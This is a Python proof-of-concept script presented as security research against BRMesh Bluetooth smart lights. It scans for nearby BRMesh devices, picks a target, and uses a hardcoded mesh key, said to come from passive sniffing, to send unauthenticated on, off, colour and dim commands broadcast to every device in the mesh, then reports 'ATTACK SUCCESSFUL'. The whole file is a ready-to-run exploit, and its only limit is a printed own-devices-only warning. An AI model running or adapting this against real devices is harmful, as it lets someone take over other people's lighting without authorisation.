#!/usr/bin/env python3
"""
Control BRMesh light using extracted mesh key
Demonstrates the security vulnerability by actually controlling a device
"""

import asyncio
import sys
import os
from bleak import BleakScanner, BleakClient
import logging

# Add path for protocol modules
sys.path.append(os.path.join(os.path.dirname(__file__), 'rootfs', 'app'))
from brmesh_control import create_control_command

logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)

# Extracted mesh key from security research
MESH_KEY = bytes.fromhex("30323336")  # "0236" in ASCII

# BRMesh BLE characteristics
BRMESH_SERVICE_UUID = "0000fff0-0000-1000-8000-00805f9b34fb"
BRMESH_WRITE_CHAR = "0000fff3-0000-1000-8000-00805f9b34fb"  # Write characteristic
BRMESH_NOTIFY_CHAR = "0000fff4-0000-1000-8000-00805f9b34fb"  # Notify characteristic

async def find_brmesh_devices():
    """Scan for BRMesh devices"""
    logger.info("🔍 Scanning for BRMesh devices...")
    logger.info("")
    
    devices_found = []
    
    def detection_callback(device, advertisement_data):
        # Look for devices with manufacturer data or specific service UUIDs
        if advertisement_data.manufacturer_data or advertisement_data.service_uuids:
            # Check for BRMesh indicators
            is_brmesh = False
            
            # Check manufacturer data (0xfff0, 0xf0ff, etc.)
            if advertisement_data.manufacturer_data:
                for mfr_id in advertisement_data.manufacturer_data.keys():
                    if mfr_id in [0xfff0, 0xf0ff, 61695, 65520]:
                        is_brmesh = True
                        break
            
            # Check service UUIDs
            if advertisement_data.service_uuids:
                for uuid in advertisement_data.service_uuids:
                    if 'fff' in uuid.lower():
                        is_brmesh = True
                        break
            
            # Check name
            name = device.name or ""
            if any(x in name.lower() for x in ['mesh', 'fastcon', 'e238', 'melpo']):
                is_brmesh = True
            
            if is_brmesh and device.address not in [d['address'] for d in devices_found]:
                devices_found.append({
                    'address': device.address,
                    'name': device.name or 'Unknown',
                    'rssi': advertisement_data.rssi,
                    'manufacturer_data': advertisement_data.manufacturer_data,
                    'service_uuids': advertisement_data.service_uuids or []
                })
                logger.info(f"📡 Found: {device.address} - {device.name or 'Unknown'} (RSSI: {advertisement_data.rssi})")
    
    scanner = BleakScanner(detection_callback=detection_callback)
    await scanner.start()
    await asyncio.sleep(10)  # Scan for 10 seconds
    await scanner.stop()
    
    return devices_found

async def control_light(device_address: str, command_type: str = "toggle"):
    """
    Send control command to BRMesh light
    
    Args:
        device_address: BLE MAC address of the device
        command_type: "on", "off", "toggle", "red", "blue", "dim"
    """
    logger.info("")
    logger.info("=" * 70)
    logger.info(f"🎯 Attempting to control device: {device_address}")
    logger.info("=" * 70)
    
    # Create payload based on command type
    if command_type == "on":
        payload = bytes([0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00] + [0x00] * 13)
        desc = "Turn ON (white, 100%)"
    elif command_type == "off":
        payload = bytes([0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00] + [0x00] * 13)
        desc = "Turn OFF"
    elif command_type == "red":
        payload = bytes([0x01, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00] + [0x00] * 13)
        desc = "Turn ON (RED, 100%)"
    elif command_type == "blue":
        payload = bytes([0x01, 0xFF, 0x00, 0x00, 0xFF, 0x00, 0x00] + [0x00] * 13)
        desc = "Turn ON (BLUE, 100%)"
    elif command_type == "dim":
        payload = bytes([0x01, 0x40, 0xFF, 0xFF, 0xFF, 0x00, 0x00] + [0x00] * 13)
        desc = "Turn ON (white, 25%)"
    else:  # toggle
        payload = bytes([0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00] + [0x00] * 13)
        desc = "Toggle/ON"
    
    # Create control command
    cmd = create_control_command(
        address=0xFF,  # Broadcast to all
        cmd_type=1,    # Control command
        payload=payload,
        mesh_key=MESH_KEY,
        seq=1
    )
    
    logger.info(f"Command: {desc}")
    logger.info(f"Payload: {cmd.hex()}")
    logger.info(f"Length:  {len(cmd)} bytes")
    logger.info("")
    
    # Try to connect and send command
    try:
        logger.info(f"📱 Connecting to {device_address}...")
        
        async with BleakClient(device_address, timeout=15.0) as client:
            if not client.is_connected:
                logger.error("❌ Failed to connect")
                return False
            
            logger.info("✅ Connected!")
            logger.info("")
            
            # List services
            logger.info("🔧 Available services:")
            services = client.services
            
            target_char = None
            for service in services:
                logger.info(f"   Service: {service.uuid}")
                for char in service.characteristics:
                    props = ", ".join(char.properties)
                    logger.info(f"      Char: {char.uuid} ({props})")
                    
                    # Look for writable characteristic
                    if 'write' in char.properties:
                        # Prefer fff3 or fff4
                        if 'fff3' in char.uuid.lower() or 'fff4' in char.uuid.lower():
                            target_char = char.uuid
                            logger.info(f"         👉 Will use this for writing")
                        elif not target_char:
                            target_char = char.uuid
            
            logger.info("")
            
            if not target_char:
                logger.error("❌ No writable characteristic found!")
                return False
            
            logger.info(f"📤 Sending command to characteristic {target_char}...")
            
            # Send the command
            await client.write_gatt_char(target_char, cmd, response=False)
            
            logger.info("✅ Command sent successfully!")
            logger.info("")
            logger.info("🔍 Waiting for response...")
            await asyncio.sleep(2)
            
            # Try to read response if available
            for service in services:
                for char in service.characteristics:
                    if 'read' in char.properties or 'notify' in char.properties:
                        try:
                            value = await client.read_gatt_char(char.uuid)
                            logger.info(f"   Response from {char.uuid}: {value.hex()}")
                        except Exception as e:
                            pass
            
            logger.info("")
            logger.info("=" * 70)
            logger.info("✅ ATTACK SUCCESSFUL!")
            logger.info("=" * 70)
            logger.info("The light should have responded to the command.")
            logger.info("This proves that an attacker with only the mesh key")
            logger.info("can control devices without any authentication.")
            
            return True
            
    except Exception as e:
        logger.error(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
        return False

async def main():
    """Main entry point"""
    print("")
    print("=" * 70)
    print("🔓 BRMesh Light Control - Security Research")
    print("=" * 70)
    print("This script will attempt to control a BRMesh light using")
    print("the mesh key extracted from passive BLE sniffing.")
    print("")
    print("⚠️  FOR SECURITY RESEARCH ON YOUR OWN DEVICES ONLY!")
    print("=" * 70)
    print("")
    
    # Scan for devices
    devices = await find_brmesh_devices()
    
    print("")
    print("=" * 70)
    print(f"Found {len(devices)} potential BRMesh device(s)")
    print("=" * 70)
    
    if not devices:
        logger.error("❌ No BRMesh devices found!")
        logger.info("")
        logger.info("💡 Make sure:")
        logger.info("   1. Lights are powered on")
        logger.info("   2. Bluetooth is enabled on this computer")
        logger.info("   3. Lights are within BLE range (10-30m)")
        return
    
    # List devices
    for i, device in enumerate(devices, 1):
        print(f"\n{i}. {device['address']} - {device['name']}")
        print(f"   RSSI: {device['rssi']} dBm")
        if device['service_uuids']:
            print(f"   Services: {', '.join(device['service_uuids'][:3])}")
    
    # Find device with e238 in name
    target_device = None
    for device in devices:
        if 'e238' in device['name'].lower():
            target_device = device
            logger.info(f"\n🎯 Found target device with 'e238': {device['address']}")
            break
    
    if not target_device:
        logger.info("\n❌ No device with 'e238' in name found")
        logger.info("Choose a device to target:")
        
        try:
            choice = input(f"\nEnter device number (1-{len(devices)}) or 'q' to quit: ").strip()
            if choice.lower() == 'q':
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(devices):
                target_device = devices[idx]
            else:
                logger.error("Invalid choice")
                return
        except (ValueError, KeyboardInterrupt):
            return
    
    print("")
    print("=" * 70)
    print("Control commands:")
    print("  1. on    - Turn on (white, 100%)")
    print("  2. off   - Turn off")
    print("  3. red   - Turn on (red, 100%)")
    print("  4. blue  - Turn on (blue, 100%)")
    print("  5. dim   - Turn on (white, 25%)")
    print("=" * 70)
    
    try:
        command = input("\nEnter command (on/off/red/blue/dim) [default: on]: ").strip().lower()
        if not command:
            command = "on"
        
        # Handle numeric input
        if command == '1':
            command = 'on'
        elif command == '2':
            command = 'off'
        elif command == '3':
            command = 'red'
        elif command == '4':
            command = 'blue'
        elif command == '5':
            command = 'dim'
        
        if command not in ['on', 'off', 'red', 'blue', 'dim']:
            logger.error("Invalid command")
            return
        
        # Execute the control
        success = await control_light(target_device['address'], command)
        
        if success:
            print("")
            print("=" * 70)
            print("🎉 Security vulnerability successfully demonstrated!")
            print("=" * 70)
        
    except KeyboardInterrupt:
        print("\n\n⚠️  Cancelled by user")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n⚠️  Interrupted")
